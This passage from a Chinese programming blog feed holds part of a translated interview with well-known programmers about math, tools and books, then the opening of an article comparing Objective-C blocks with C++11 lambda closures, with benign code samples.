<p>我想说，简单的数学基础让我的技能比一般程序员好过5%到10%。如果我了解更多的数学，我确信我会比今天做得更好，所以，我每周都会花几个小时学习数学。</p>
<p>我喜欢物理，我还在学习物理，我会花我一生去理解量子力学。但是我个却没有发现物理对我的程序员工作有多有用。当然，如果我从事一些和物理相关的工作，可能会有用，例如：3D游戏编程，或是某种物理特性仿真。</p>
<p><strong><em>Linus Torvalds</em></strong></p>
<p>我个人认为有很强的数学背景是一件好事。但我不确信物理是不是这样的，但是我深信懂数学的人会让你成为一个更好的程序员。这些智力模型都是相通的。</p>
<p><strong><em>David Heinemeier Hansson</em></strong></p>
<p>根本没用。至少对业务编程和Web应用来说没用。但是数学可能对一个人的写作有很重要的帮助。</p>
<p><strong><em>Peter Norvig</em></strong></p>
<p>是的。很多相法都是从数学来的：归纳，递归，逻辑，等等。</p>
<p><strong><em>Dave Thomas</em></strong></p>
<p>也许吧。但老实说，我没见到过懂这些学科和好的程序员有很大的相关性。</p>
<p>然而，我见过有音乐背景和好的编程技能有很强的相关性。我不知道这为什么，但是我怀疑大脑中的某个区域可以让人即可以写出好的音乐，也可以写出好的代码。（陈皓注：<em><a href="https://weibo.com/n/Sir%E9%98%BF%E6%80%AA">@Sir阿怪</a> </em>貌似就是这个例子）</p>
<p><strong><em>Guido Van Rossum</em></strong></p>
<p>数学，当然（对于一些学科是很重要的，我不关心微分方程，但是代数和逻辑学是很重要的），物理，我不觉得对编程技能有关，当然物理在其它很多地方很有意思。</p>
<p><strong><em>James Gosling</em></strong></p>
<p>当然！数学教会了我逻辑和推导……让我有了一双懂分析的眼睛。当我们分析算法的时候，数学是无法被取代的。</p>
<p><strong><em>Bjarne Stroustrup</em></strong></p>
<p>这要看程序员自己和项目性质了。以前的数学很有用，物理一般，但是学好物理是是学习应用数学最好的一条路。</p>
<p><strong><em>Tim Bray</em></strong></p>
<p>对我来说，在我的编程生涯中我从来都没有用过大学里教的数学。</p>
<h4>
<span class="ez-toc-section" id="Q_4_%E5%85%B3%E4%BA%8E%E7%BC%96%E7%A8%8B%EF%BC%8C%E4%BD%A0%E4%BB%AC%E8%AE%A4%E4%B8%BA%E6%8E%A5%E4%B8%8B%E6%9D%A5%E7%9A%84%E5%A4%A7%E4%BA%8B%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9FX-Oriented%E7%BC%96%E7%A8%8B%EF%BC%8CY%E8%AF%AD%E8%A8%80%EF%BC%8C%E9%87%8F%E5%AD%90%E7%94%B5%E8%84%91_%EF%BC%9F"></span>Q 4: 关于编程，你们认为接下来的大事是什么？X-Oriented编程，Y语言，量子电脑 ？<span class="ez-toc-section-end"></span>
</h4>
<p><strong><em>Steve Yegge</em></strong></p>
<p>我认为Web编程会逐渐变成最最重要的客户端编程。而对于原来传统的客端端编程都会被废弃，如： GTK, Java Swing/SWT, Qt, 当然，所有的和平台有关的东西，例如 Cocoa 和 Win32/MFC/等。</p>
<p>当然，这不会一晚上就发生了。这会在第一个十年内缓慢地发生，而在第二个十年内，Web Apps最终会胜利。工具，语言，协议，和浏览器技术都会进步得非常快，并会完全超出你今天能干的事。每一年都会向前进一步，而从今天开始，我会最终决定把我所有的应用开发全部切换到基于浏览器的应用。（陈皓注：我也是这么认为的，参看《<a title="来信， 创业 和 移动互联网" href="https://coolshell.cn/articles/5815.html">来信，创业，移动互联网</a>》）</p>
<p>微软和苹果最终不愿意这个事发生，所以，触发这个事的第一步会是一个开源的浏览器（如：Firefox）开始到了支配市场的地位，然后会出现某种Firefox的杀手级应用（这种杀手级应用可能会像iTunes一样，所有的人都会用它，只需要下载Firefox）</p>
<p><strong><em>Linus Torvalds</em></strong></p>
<p>我并不认为我们会看到一个“大的跳跃”。我们只会看到很多的工作帮助我们把那些沉闷辛苦的工作变得更简单——会有一个更高级别的语言，也许把简单的数据库集成到语言中来会是其中最主要一个。</p>
<p>例如，我个人相信“Visual Basic”在编程方面比“面向对象”做得更多。当然，人们都在取笑VB是一个很烂的编程语言，并且人们在谈论OO语言都十多年了。但我还觉得不是这样的，Visual Basic 不是一个好的语言，但是我觉得VB那简单的数据库接口比OO更重要。</p>
<p>所以，我认为会语言有很多的改进，并且，硬件的改进会让编程更容易，但我并不期望会有巨大的生产力或是革命性的改进。</p>
<p>至少，你不会开始搞真正的AI的东西，我也不认为真的AI会变成某种你不需要编程的东西。</p>
<p><strong><em>David Heinemeier Hansson</em></strong></p>
<p>我从不试图预测未来。我也不相信命运一说。最好预测未来的方式就是去实现未来。</p>
<p><strong><em>Peter Norvig</em></strong></p>
<p>大规模的分布式处理</p>
<p><strong><em>Dave Thomas</em></strong></p>
<p>下一个最牛的事会被再下一个最牛的事所掩盖，然后再被再再下一个所掩盖，再再再下一个所掩盖……。这是一件没完没了的事，所以，我并不会试图去找最牛的事，因为这会让人们忘了那些最真实的问题：把基本的东西做对。我们要让用户更满意，专注于交付有价值的东西，自豪于我们做的事。一个程序员可以使用很多工具把这些事做得更好，而不是去追逐时尚和流行。</p>
<p><strong><em>Guido Van Rossum</em></strong></p>
<p>对不起，我没有那么多水晶球。我CGI被发明了5年后预测过它 :-)</p>
<p><strong><em>James Gosling</em></strong></p>
<p>有两个事是我现在最关心的，那就是要对付并行和复杂。</p>
<p><strong><em>Bjarne Stroustrup</em></strong></p>
<p>我不知道，我也不愿猜。</p>
<p><strong><em>Tim Bray</em></strong></p>
<p>不知道。</p>
<h4>
<span class="ez-toc-section" id="Q_5_%E5%A6%82%E6%9E%9C%E4%BD%A0%E6%9C%893%E4%B8%AA%E6%9C%88%E5%AD%A6%E4%B8%80%E4%B8%AA%E7%9B%B8%E5%AF%B9%E8%BE%83%E6%96%B0%E7%9A%84%E6%8A%80%E6%9C%AF%EF%BC%8C%E4%BD%A0%E4%BC%9A%E5%AD%A6%E4%BB%80%E4%B9%88%EF%BC%9F"></span>Q 5: 如果你有3个月学一个相对较新的技术，你会学什么？<span class="ez-toc-section-end"></span>
</h4>
<p><strong><em>Steve Yegge</em></strong></p>
<p>我的确有3个月的业余时间，我准备学一下 Dojo (<a href="https://dojotoolkit.org" target="_blank">http://dojotoolkit.org</a>) 和高级 AJAX 及 DHTML。我会通过开发一个相当牛的Web应用来学习他们。Dojo 真的酷，并且我确信它会越来越好。</p>
<p><strong><em>Linus Torvalds</em></strong></p>
<p>嗯，我真的很爱做 FPGA（可编程芯片），但我部是太忙了而不是坐来来开始学习。我喜爱和硬件打交道：很明显这个原因是因为我最终在做操作系统，因为操作系统（除了编译器）基本上都是在和硬件打交道，但我没有真正地自己去设计和做一个硬件。</p>
<p><strong><em>David Heinemeier Hansson</em></strong></p>
<p>Mac 的 Cocoa 编程</p>
<p><strong><em>Peter Norvig</em></strong></p>
<p>我想把 Javascript 学得更好，<del>然也</del>当然也想学 flash.</p>
<p><strong><em>Dave Thomas</em></strong></p>
<p>如果“新”是对于我来说，那么我会去学钢琴课。</p>
<p>如果“新”是说技术，我猜 我会选择学习某种和为残疾人服务的有关的技术。</p>
<p><strong><em>Guido Van Rossum</em></strong></p>
<p>单板滑雪。</p>
<p><strong><em>James Gosling</em></strong></p>
<p>搞点有乐趣的东西，我会学习最新的3D渲染技术。我可能会写一个光子映射渲染器。</p>
<p><strong><em>Bjarne Stroustrup</em></strong></p>
<p>3个月只有很少的东西你可以学，我觉得你只能参加某个成熟领域的培训。</p>
<p><strong><em>Tim Bray</em></strong></p>
<p>安全，加密，数字签名，身份标识，等等。对我来说，从没学过这些东西对我来说是个很大的问题。</p>
<h4>
<span class="ez-toc-section" id="Q_6_%E4%BD%A0%E4%BB%AC%E8%A7%89%E5%BE%97%E5%A6%82%E4%BD%95%E8%AE%A9%E4%B8%80%E4%BA%9B%E7%A8%8B%E5%BA%8F%E5%91%98%E5%8F%AF%E8%83%BD%E6%9C%89%E8%B6%85%E8%BF%87%E5%85%B6%E5%AE%83%E7%A8%8B%E5%BA%8F%E5%91%9810%E5%80%8D%E6%88%96100%E5%80%8D%E7%9A%84%E7%94%9F%E4%BA%A7%E5%8A%9B%EF%BC%9F"></span>Q 6: 你们觉得如何让一些程序员可能有超过其它程序员10倍或100倍的生产力？<span class="ez-toc-section-end"></span>
</h4>
<p><strong><em>Steve Yegge</em></strong></p>
<p>我想你应该考虑一下为什么不是让所有的程序员都一样牛。托马斯爱迪生有一句关于天才的名言也许会给你一些启示。</p>
<p><strong><em>Linus Torvalds</em></strong></p>
<p>我真的不知道，我想，一些人之所以更牛是因为他们可以专注于那些重要的事，而更多的只不过是在应付。那些我所知道的真的很牛的程序员从很年轻的时候就在做事了。</p>
<p><strong><em>David Heinemeier Hansson</em></strong></p>
<p>把难题变简单的能力。</p>
<p><strong><em>Peter Norvig</em></strong></p>
<p>把整体问题一次性放入大脑的能力。</p>
<p><strong><em>Dave Thomas</em></strong></p>
<p>他们关心他们做的事。</p>
<p><strong><em>Guido Van Rossum</em></strong></p>
<p>大脑结构基因不同。</p>
<p><strong><em>James Gosling</em></strong></p>
<p>他们知道他们要做什么，他们不并不急于仓促行事。他们有他们要做的事的整个蓝图。</p>
<p><strong><em>Bjarne Stroustrup</em></strong></p>
<p>首先，缺少足够的职业培训，或基础不够。其次，这些人要即聪明（那种可以把事情想清楚，直达核心的能力），又有经验，并有使用工具的知识。编程需要把理论和实践结合起来 – 并不是使用没有实际业务的知识。</p>
<p><strong><em>Tim Bray</em></strong></p>
<p>令人惊讶的思维改变。</p>
<h4>
<span class="ez-toc-section" id="Q_7_%E4%BB%80%E4%B9%88%E5%B7%A5%E5%85%B7%E6%98%AF%E4%BD%A0%E7%9A%84%E6%9C%80%E7%88%B1%EF%BC%88%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%EF%BC%8C%E7%BC%96%E7%A8%8B%E8%84%9A%E6%9C%AC%E8%AF%AD%E8%A8%80%EF%BC%8C%E6%96%87%E6%9C%AC%E7%BC%96%E8%BE%91%E5%99%A8%EF%BC%8C%E7%89%88%E6%9C%AC%E7%AE%A1%E7%90%86%EF%BC%8Cshell%EF%BC%8C%E6%95%B0%E6%8D%AE%E5%BA%93%EF%BC%8C%E6%88%96%E5%85%B6%E5%AE%83%E6%B2%A1%E5%AE%83%E4%BD%A0%E6%B4%BB%E4%B8%8D%E4%BA%86%E7%9A%84%E5%B7%A5%E5%85%B7%EF%BC%89%EF%BC%8C%E4%B8%BA%E4%BB%80%E4%B9%88%E4%B8%8D%E6%98%AF%E5%88%AB%E7%9A%84%EF%BC%9F"></span>Q 7: 什么工具是你的最爱（操作系统，编程/脚本语言，文本编辑器，版本管理，shell，数据库，或其它没它你活不了的工具），为什么不是别的？<span class="ez-toc-section-end"></span>
</h4>
<p><strong><em>Steve Yegge</em></strong></p>
<p>操作系统： Unix! 我用Linux，cygwin，和 darwin。你无法打败那些高效的工具。每一个程序员都应该学习使用/bin和/usr/bin下的所有命令。</p>
<p>脚本语言：Ruby。我几乎对所有的重要的脚本语言都很熟悉： Perl, Python, Tcl, Lua, Awk, Bash, 和一些我忘了的。但是我太懒了，而Ruby是目前所有脚本语言中最简单的，它应该是天堂制造的。</p>
<p>编程语言：没有一个我喜欢的，我觉得所有的编程语言都很扯。我倾向于Java，因为它很强，可跨平台，有多不错的工具和类库。但是Java未来会进化或是灭亡，Java还没有好到可以永远保持其领先地位。</p>
<p>文本编辑器：Emacs，因为这是迄今最好的编辑器。</p>
<p>版本管理：SVN，Perforce更好一些，但是也很贵。</p>
<p>Shell脚本： Bash, 因为我太懒了去学一个更好的。</p>
<p>数据库： 当然是MySQL，没有之一。</p>
<p>其它：我发现GIMP是无价的，但也是令人恼<del>炎</del>火的。我用这个东西好几年了，但什么也没干，但是我没它活不了。很讽刺吧。Firefox 越来越是我最重要的工具。如果让我去用IE和Safari，我会有严重的窒息感。</p>
<p>注：所有的这些工具 (Unix, Emacs, Firefox, GIMP, MySQL, Bash, SVN, Perforce) 都有一个共同点：他们是可扩展的。例如：他们都有可编程的API。伟大的程序员知道怎么编写他们的工具，而不只是去使用。</p>
<p><strong><em>Linus Torvalds</em></strong></p>
<p>实际上，我最终也没有用过几个工具，而我却花了一些时间让这些工具为我工作。最大的事是我自己写了个操作系统，我也自己写了个版本管理系统（git），我用的文本编辑器是 micro-emacs – 最终我也定制和扩展了它。</p>
<p>除了上面三个，其它的东西，我深度关心我的邮件阅读软件，我使用“pine”，并不是因为它是史上最好的邮件阅读软件，因为我习惯了，用它我会有最低限度的大惊小怪。</p>
<p><strong><em>David Heinemeier Hansson</em></strong></p>
<p>OS X, TextMate, Ruby, Subversion, MySQL. 这些组合让我很快乐。我希望那些有好的品味的专注于重要的事的工具。</p>
<p><strong><em>Peter Norvig</em></strong></p>
<p>我不喜欢那三大操作系统 – Windows, Mac, Linux。我喜欢 Python 和 Lisp. Emacs.</p>
<p><strong><em>Dave Thomas</em></strong></p>
<p>在使用Linux10年后我转到Mac平台有两年多了。Mac并不见得有多好，但是它不需要很牛的技术，也不需要经常维护，这让我可以让我更专心得使用它。</p>
<p>我并不是一个单一工具的信仰者，我喜欢换来换去的，这样可以让我有更多的经历。现在，我使用 OSX, Emacs, TextMate, Rails, Ruby, SVN, CVS, Rake, make, xsltproc, TeX, MySQL, Postgres, 还有一堆高效的小工具。没人知道我明年会用什么。</p>
<p><strong><em>Guido Van Rossum</em></strong></p>
<p>Unix/Linux, Python, vi+emacs, Firefox.</p>
<p><strong><em>James Gosling</em></strong></p>
<p>这些天，我在用 NetBeans. 用它可以干我想干的所有的事，清洁，简单和高效。这是最好的我永远要生活在其中的环境了。</p>
<p><strong><em>Bjarne Stroustrup</em></strong></p>
<p>Unix, sam (一个非常简单的文本编辑器), 当然，一个好的C++编译器。</p>
<p><strong><em>Tim Bray</em></strong></p>
<p>我喜欢 Unix-like 的操作系统，像 Python 和 Ruby 的动态语言，像Java的静态语言（具体说来是Java API） Emacs, 还有, bash, whatever, NetBeans.</p>
<h4>
<span class="ez-toc-section" id="Q_8_%E4%BD%A0%E6%9C%80%E5%96%9C%E6%AC%A2%E7%9A%84%E7%BC%96%E7%A8%8B%E4%B9%A6%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9F"></span>Q 8: 你最喜欢的编程书是什么？<span class="ez-toc-section-end"></span>
</h4>
<p><strong><em>Steve Yegge</em></strong></p>
<p>大哥，这个问题太难了。也许是”Gödel, Escher, Bach: an Eternal Golden Braid” (作者Hofstadter)？虽然这不是严格意义上的编程的书，如果你要明确意义上的编程书，那么可能是 SICP (mitpress.mit.edu).</p>
<p><strong><em>Linus Torvalds</em></strong></p>
<p>嗨。这两天我在读一些小说，或是非计算机读物（老的但是有用的 “The Selfish Gene” 作者 Richard Dawkins)。</p>
<p>如果要问我编程的书，我脑子里只出现了唯 一一本真正的经典的编程的书 Kernighan &amp; Ritchie 的 “The C Programming Language”，因为这本书太牛了，可读性强并且很短。考<del>虚</del>虑一下你想学到这世上一门最重要编程语言，并且它很要很薄，而且还有可读性，这真是一个奇迹。</p>
<p>也就是说，其它我很喜欢的书并不是编程的，而是关于计算机结构和硬件的。那显然是 Patterson &amp; Hennessy 的计算机结构的书，但是我个人也许更喜欢 Crawford &amp; Gelsinger 的 “Programming the 80386?，这是我在开始写Linux时用的书。</p>
<p>相似的原因，我还喜欢 Andrew Tanenbaum 的 “Operating Systems: Design and Implementation”.</p>
<p><strong><em>David Heinemeier Hansson</em></strong></p>
<p>我喜欢 Extreme Programming Explained 其摒弃了一般的编程实践，我还喜欢 Patterns of Enterprise Application Architecture 其出众地说明了抽象和具现的平衡。</p>
<p><strong><em>Peter Norvig</em></strong></p>
<p>Structure and Interpretation of Computer Programs</p>
<p><strong><em>Dave Thomas</em></strong></p>
<p>这关系到你所谓的“最喜欢”，也许我最喜欢的是IBM的 “IBM/360 Principles of Operation.”</p>
<p><strong><em>Guido Van Rossum</em></strong></p>
<p>Neil Stephenson的 Quicksilver.</p>
<p><strong><em>James Gosling</em></strong></p>
<p>Programming Pearls 作者Jon Bentley.</p>
<p><em><strong>Bjarne Stroustrup</strong></em></p>
<p>K&amp;R.</p>
<p><strong><em>Tim Bray</em></strong></p>
<p>Bentley的 Programming Pearls</p>
<h4>
<span class="ez-toc-section" id="Q_9_%E4%BD%A0%E6%9C%80%E5%96%9C%E6%AC%A2%E7%9A%84%E5%92%8C%E7%BC%96%E7%A8%8B%E6%97%A0%E5%85%B3%E7%9A%84%E4%B8%80%E6%9C%AC%E4%B9%A6%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9F"></span>Q 9: 你最喜欢的和编程无关的一本书是什么？<span class="ez-toc-section-end"></span>
</h4>
<p><strong><em>Steve Yegge</em></strong></p>
<p>只能是一本吗？这不可能。有太多太多我喜欢的书了。</p>
<p>我这个月读过最喜欢的书是 “Stardust” (Neil Gaiman) 和 “The Mind’s I” (Hofstadter/Dennet).</p>
<p>我最喜欢的作者是 Kurt Vonnegut, Jr. 和 Jack Vance.</p>
<p><strong><em>Linus Torvalds</em></strong></p>
<p>我在前面说过 Dawkins的 Selfish Gene。在小说方面，有很多很多我enjoy的，但是几乎没有我特别喜欢的一本。我一般不会重读一本书，我的选择总是会变。我可能更喜欢科幻小说，如：”Stranger in a Strange Land” 作者 Heinlein，这是我青少年时期最喜欢的书，但现在并不是我喜欢的了。</p>
<p><strong><em>David Heinemeier Hansson</em></strong></p>
<p>1984, George Orwell.</p>
<p><strong><em>Guido Van Rossum</em></strong></p>
<p>Neil Stephenson 的 Quicksilver.</p>
<p><strong><em>James Gosling</em></strong></p>
<p>Guns, Germs &amp; Steel 作者 Jared Diamond</p>
<p><strong><em>Bjarne Stroustrup</em></strong></p>
<p>我没有固定喜欢的书。目前是 O’Brian 的 Aubrey/Maturin 系列。</p>
<p><strong><em>Tim Bray</em></strong></p>
<p>One Day in the Life of Ivan Denisovich</p>
<h4>
<span class="ez-toc-section" id="Q_10_%E4%BD%A0%E6%9C%80%E5%96%9C%E6%AC%A2%E7%9A%84%E4%B9%90%E9%98%9F%E6%BC%94%E5%A5%8F%E5%AE%B6%E4%BD%9C%E6%9B%B2%E5%AE%B6%EF%BC%9F"></span>Q 10: 你最喜欢的乐队/演奏家/作曲家？<span class="ez-toc-section-end"></span>
</h4>
<p><strong><em>Steve Yegge</em></strong></p>
<p>喜欢的风格：古典音乐，动漫原声音乐，电脑游戏音乐</p>
<p>喜欢的作曲家：Rachmaninoff, Chopin, Bach</p>
<p>喜欢的演奏者：David Russell (古典吉它), Sviatoslav Richter (钢琴)</p>
<p>喜欢的动漫音乐： Last Exile, Haibane Renmei</p>
<p><strong><em>Linus Torvalds</em></strong></p>
<p>实际上我并不太喜欢音乐，但是当我听音乐的时候，我一般听经典摇滚乐，如： Pink Floyd ，Beatles ，Queen 和 The Who 乐队。</p>
<p><strong><em>David Heinemeier Hansson</em></strong></p>
<p>我喜欢很多风格。 Beth Orton, Aimee Mann, Jewel, Lauryn Hill. Actually, 所有的这些都可以归到 Girls with Guitars ;).</p>
<p><strong><em>Guido Van Rossum</em></strong></p>
<p>Philip Glass.</p>
<p><strong><em>James Gosling</em></strong></p>
<p>我喜欢听民歌: Christine Lavin, Woody Guthrie, Pete Seeger…</p>
<p><strong><em>Bjarne Stroustrup</em></strong></p>
<p>乐队: The Dixie Chicks. 作曲家: Beethoven.</p>
<p><strong><em>Tim Bray</em></strong></p>
<p>看我的博客吧。</p>
<p>. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .</p>
<p>. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .</p>
<h4>
<span class="ez-toc-section" id="_%E8%A1%A5%E5%85%85%E8%AF%B4%E6%98%8E"></span><strong> 补充说明</strong><span class="ez-toc-section-end"></span>
</h4>
<p>我之所以发现这篇文章，是因为我读到了 Jeff Atwood 的这篇名为 “<a href="http://www.codinghorror.com/blog/2006/07/linus-torvalds-visual-basic-fan.html">Linus Torvalds, Visual Basic Fan</a>” 的文章，这篇文章指向了 “<a href="http://sztywny.titaniumhosting.com/2006/07/23/stiff-asks-great-programmers-answers/">STIFF ASKS, GREAT PROGRAMMERS ANSWER</a>” 这篇文章，但是链接已坏了，然后，我搜了一下也没有搜到这篇文章。然后我去了 archive.org 搜了一下，并找到了这篇由 Jaroslaw Rzeszótko 写的博客。</p>
<p>因为这篇博文现在找不到了，所以，我想我应该重新把它贴出来，这样其它人可以读一下这篇有意思的文章。所以，我向原作者取得了授权，再次感谢 Jaroslaw!</p>
<p>（全文完）</p>
 ]]></content>
<pubDate>2012-09-14T08:29:54+08:00</pubDate>
<guid>https://coolshell.cn/articles/8275.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ C/C++语言中闭包的探究及比较 ]]></title>
<link>https://coolshell.cn/articles/8309.html</link>
<content><![CDATA[ 
<p>（<strong><span style="color: #cc0000;">感谢投稿人</span> <a href="https://weibo.com/jasonmblog" target="_blank">@思禽饮霜</a> </strong>）</p>
<p>这里主要讨论的是C语言的扩展特性<a href="https://en.wikipedia.org/wiki/Blocks_(C_language_extension)" target="_blank">block</a>。该特性是Apple为C、C++、Objective-C增加的扩展，让这些语言可以用类Lambda表达式的语法来创建<a href="https://en.wikipedia.org/wiki/Closure_(computer_science)" target="_blank">闭包</a>。前段时间，在对CoreData存取进行封装时（让开发人员可以更简洁快速地写相关代码），我对block机制有了进一步了解，觉得可以和C++ 11中的Lambda表达式相互印证，所以最近重新做了下整理，分享给大家。</p>
<div id="ez-toc-container" class="ez-toc-v2_0_17 counter-hierarchy counter-decimal ez-toc-grey">
<div class="ez-toc-title-container">
<p class="ez-toc-title">目录</p>
<span class="ez-toc-title-toggle"></span>
</div>
<nav><ul class="ez-toc-list ez-toc-list-level-1">
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-1" href="#0_%E7%AE%80%E5%8D%95%E5%88%9B%E5%BB%BA%E5%8C%BF%E5%90%8D%E5%87%BD%E6%95%B0" title="0. 简单创建匿名函数">0. 简单创建匿名函数</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-2" href="#1_%E4%BB%8E%E8%AF%AD%E6%B3%95%E4%B8%8A%E7%9C%8B%E5%A6%82%E4%BD%95%E6%8D%95%E8%8E%B7%E5%A4%96%E9%83%A8%E5%8F%98%E9%87%8F" title="1. 从语法上看如何捕获外部变量">1. 从语法上看如何捕获外部变量</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-3" href="#2_%E4%BB%8E%E8%AF%AD%E6%B3%95%E4%B8%8A%E7%9C%8B%E5%A6%82%E4%BD%95%E4%BF%AE%E6%94%B9%E5%A4%96%E9%83%A8%E5%8F%98%E9%87%8F" title="2. 从语法上看如何修改外部变量">2. 从语法上看如何修改外部变量</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-4" href="#3_%E4%BB%8E%E5%AE%9E%E7%8E%B0%E4%B8%8A%E7%9C%8B%E5%A6%82%E4%BD%95%E6%8D%95%E8%8E%B7%E5%A4%96%E9%83%A8%E5%8F%98%E9%87%8F" title="3. 从实现上看如何捕获外部变量">3. 从实现上看如何捕获外部变量</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-5" href="#4_%E4%BB%8E%E5%AE%9E%E7%8E%B0%E4%B8%8A%E7%9C%8B%E5%A6%82%E4%BD%95%E4%BF%AE%E6%94%B9%E5%A4%96%E9%83%A8%E5%8F%98%E9%87%8F%EF%BC%88_block%E7%B1%BB%E5%9E%8B%E6%8C%87%E7%A4%BA%E7%AC%A6%EF%BC%89" title="4. 从实现上看如何修改外部变量（__block类型指示符）">4. 从实现上看如何修改外部变量（__block类型指示符）</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4">
<a class="ez-toc-link ez-toc-heading-6" href="#5_%E8%83%8C%E5%90%8E%E7%9A%84%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86%E5%8A%A8%E4%BD%9C" title="5. 背后的内存管理动作">5. 背后的内存管理动作</a><ul class="ez-toc-list-level-5">
<li class="ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-7" href="#51_%E6%8B%B7%E8%B4%9Dblock%E7%BB%93%E6%9E%84%E4%BD%93" title="5.1 拷贝block结构体">5.1 拷贝block结构体</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-8" href="#52_%E6%8B%B7%E8%B4%9D%E6%8D%95%E8%8E%B7%E7%9A%84%E5%8F%98%E9%87%8F%EF%BC%88_block%E5%8F%98%E9%87%8F%EF%BC%89" title="5.2 拷贝捕获的变量（__block变量）">5.2 拷贝捕获的变量（__block变量）</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-9" href="#53_forwarding%E6%8C%87%E9%92%88%E7%9A%84%E4%BD%9C%E7%94%A8" title="5.3 __forwarding指针的作用">5.3 __forwarding指针的作用</a></li>
</ul>
</li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-10" href="#%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99%EF%BC%9A" title="参考资料：">参考资料：</a></li>
</ul></nav>
</div>
<h4>
<span class="ez-toc-section" id="0_%E7%AE%80%E5%8D%95%E5%88%9B%E5%BB%BA%E5%8C%BF%E5%90%8D%E5%87%BD%E6%95%B0"></span>0. 简单创建匿名函数<span class="ez-toc-section-end"></span>
</h4>
<p>下面两段代码的作用都是创建匿名函数并调用，输出Hello, World语句。分别使用Objective-C和C++ 11：</p>
<p><code data-enlighter-language="c" class="EnlighterJSRAW">^{ printf("Hello, World!\n"); } ();</code><br>
<code data-enlighter-language="c" class="EnlighterJSRAW">[] { cout &lt;&lt; "Hello, World" &lt;&lt; endl; } ();</code></p>
<p>Lambda表达式的一个好处就是让开发人员可以在需要的时候临时创建函数，便捷。</p>
<p>在创建闭包（或者说Lambda函数）的语法上，Objective-C采用的是上尖号<span style="color: #ff0000;">^</span>，而C++ 11采用的是配对的方括号<span style="color: #ff0000;">[]</span>。</p>
<p>不过“<span style="color: #808000;">匿名函数</span>”一词是针对程序员而言的，编译器还是采取了一定的命名规则。</p>
<p>比如下面Objective-C代码中的3个block，</p>
<p></p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">#import &lt;Foundation/Foundation.h&gt;

int (^maxBlk)(int , int) = ^(int m, int n){ return m &gt; n ? m : n; };

int main(int argc, const char * argv[])
{
    ^{ printf("Hello, World!\n"); } ();

    int i = 1024;
    void (^blk)(void) = ^{ printf("%d\n", i); };
    blk();

    return 0;
}
</pre>
<p>会产生对应的3个函数：</p>
<p><span id="more-8309"></span></p>
<p></p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">__maxBlk_block_func_0
__main_block_func_0
__main_block_func_1
</pre>
<p>可见函数的命名规则为：__<span style="color: #ff0000;">{$Scope}</span>_block_func_<span style="color: #ff0000;">{$index}</span>。其中{$Scope}为block所在函数，如果{$Scope}为全局就取block本身的名称；{$index}表示该block在{$Scope}作用域内出现的顺序（第几个block）。</p>
<h4>
<span class="ez-toc-section" id="1_%E4%BB%8E%E8%AF%AD%E6%B3%95%E4%B8%8A%E7%9C%8B%E5%A6%82%E4%BD%95%E6%8D%95%E8%8E%B7%E5%A4%96%E9%83%A8%E5%8F%98%E9%87%8F"></span>1. 从语法上看如何捕获外部变量<span class="ez-toc-section-end"></span>
</h4>
<p>在上面的代码中，已经看到“<span style="color: #808000;">匿名函数</span>”可以直接访问外围作用域的变量i：</p>
<p></p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">int i = 1024;
void (^blk)(void) = ^{ printf("%d\n", i); };
blk();
</pre>
<p>当匿名函数和non-local变量结合起来，就形成了闭包（个人看法）。<br>
这一段代码可以成功输出i的值。</p>
<p>我们把一样的逻辑搬到C++上：</p>
<p></p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">int i = 1024;
auto func = [] { printf("%d\n", i); };
func();
</pre>
<p>GCC会输出：<span style="color: #808000;"><span style="color: #ff0000;">错误</span>：‘i’未被捕获</span>。可见在C++中无法直接捕获外围作用域的变量。</p>
<p>以BNF来表示Lambda表达式的上下文无关文法，存在：</p>
<p></p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">lambda-expression : lambda-introducer lambda-parameter-declarationopt compound-statement
lambda-introducer : [ lambda-captureopt ]
</pre>
<p>因此，方括号中还可以加入一些选项：</p>
<p></p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">[]        Capture nothing (or, a scorched earth strategy?)
[&amp;]       Capture any referenced variable by reference
[=]       Capture any referenced variable by making a copy
[=, &amp;foo] Capture any referenced variable by making a copy, but capture variable foo by reference
[bar]     Capture bar by making a copy; don't copy anything else
[this]    Capture the this pointer of the enclosing class
</pre>
<p>根据文法，对代码加以修改，使其能够成功运行：</p>
<p></p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">bash-3.2# vi testLambda.cpp
bash-3.2# g++-4.7 -std=c++11 testLambda.cpp -o testLambda
bash-3.2# ./testLambda
1024
bash-3.2# cat testLambda.cpp
#include &lt;iostream&gt;

using  namespace std;

int main()
{
     int i = 1024;
     auto func = [=] { printf("%d\n", i); };
     func();

     return 0;
}
bash-3.2#
</pre>
<h4>
